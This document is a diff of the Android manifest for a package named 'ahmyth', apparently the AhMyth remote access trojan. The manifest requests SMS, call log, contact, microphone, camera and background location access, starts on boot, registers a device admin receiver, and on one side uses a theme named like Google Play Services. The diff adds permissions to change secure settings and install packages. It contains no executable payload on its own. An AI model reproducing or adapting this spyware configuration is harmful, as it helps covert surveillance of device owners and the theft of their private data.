@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="31" android:compileSdkVersionCodename="12" package="ahmyth.mine.king.ahmyth" platformBuildVersionCode="31" platformBuildVersionName="12">
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="29" android:compileSdkVersionCodename="10.0.0" package="ahmyth.mine.king.ahmyth" platformBuildVersionCode="29" platformBuildVersionName="10.0.0">
     <uses-feature android:name="android.hardware.camera"/>
     <uses-feature android:name="android.hardware.camera.autofocus"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
@@ -6,6 +6,8 @@
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
@@ -15,8 +17,6 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
-    <uses-permission android:name="android.permission.CALL_PHONE"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
@@ -24,16 +24,17 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:debuggable="true" android:hardwareAccelerated="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:requestLegacyExternalStorage="true" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.GooglePlayService" android:usesCleartextTraffic="true">
-        <activity android:exported="true" android:name="ahmyth.mine.king.ahmyth.MainActivity">
+    <uses-permission android:name="android.permission.BACKGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+    <application android:allowBackup="true" android:appComponentFactory="android.support.v4.app.CoreComponentFactory" android:debuggable="true" android:hardwareAccelerated="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:largeHeap="true" android:requestLegacyExternalStorage="true" android:supportsRtl="true" android:theme="@style/AppTheme" android:usesCleartextTraffic="true">
+        <activity android:launchMode="singleInstance" android:name="ahmyth.mine.king.ahmyth.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-        <service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.services.MainService"/>
-        <receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.receivers.MyReceiver">
+        <service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>
+        <receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
@@ -43,11 +44,8 @@
             <intent-filter>
                 <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
             </intent-filter>
-            <intent-filter android:priority="5822">
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
-            </intent-filter>
         </receiver>
-        <receiver android:exported="false" android:name="ahmyth.mine.king.ahmyth.receivers.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+        <receiver android:name="ahmyth.mine.king.ahmyth.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
             <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
